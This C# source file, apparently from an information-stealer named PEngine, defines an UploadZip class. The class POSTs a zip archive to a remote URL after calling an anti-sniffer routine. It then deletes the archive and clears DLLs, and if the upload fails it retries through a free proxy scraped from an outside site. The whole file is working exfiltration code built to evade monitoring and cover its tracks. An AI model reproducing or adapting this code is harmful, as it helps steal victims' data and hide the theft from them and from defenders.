﻿namespace PEngine.Loader
{
    using PEngine.Helpers;
    using PEngine.Main;
    using PEngine.Sticks;
    using System;
    using System.Net;

    public class UploadZip
    {
        public static void Inizialize(Uri url, string method, string filename, bool status = true)
        {
            try
            {
                using (var client = new WebClient())
                {
                    if (method.Equals("POST"))
                    {
                        try
                        {
                            AntiSniffer.Inizialize();
                            client.UploadFile(url, method, filename);
                            CombineEx.DeleteFile(GlobalPath.ZipAdd);
                            Ccleaner.ClearDll();
                        }
                        catch (WebException) { ProxyStarted(url, method, filename); }
                        catch (UriFormatException) { }
                    }
                }
            }
            catch (WebException) { ProxyStarted(url, method, filename); }
        }

        private static void ProxyStarted(Uri link, string method, string filename, bool True = true)
        {
            ProxyGrabber.Parse("http://xseo.in/freeproxy");
            try
            {
                using (var client = new WebClient())
                {
                    if (method.Equals("POST"))
                    {
                        AntiSniffer.Inizialize();
                        client.Proxy = new WebProxy(ProxyGrabber.builder.ToString());
                        client.UploadFile(link, method, filename);
                        CombineEx.DeleteFile(GlobalPath.ZipAdd);
                        Ccleaner.ClearDll();
                    }
                }
            }
            catch (WebException) { Inizialize(link, method, filename); }
            catch (UriFormatException) { }
        }
    }
}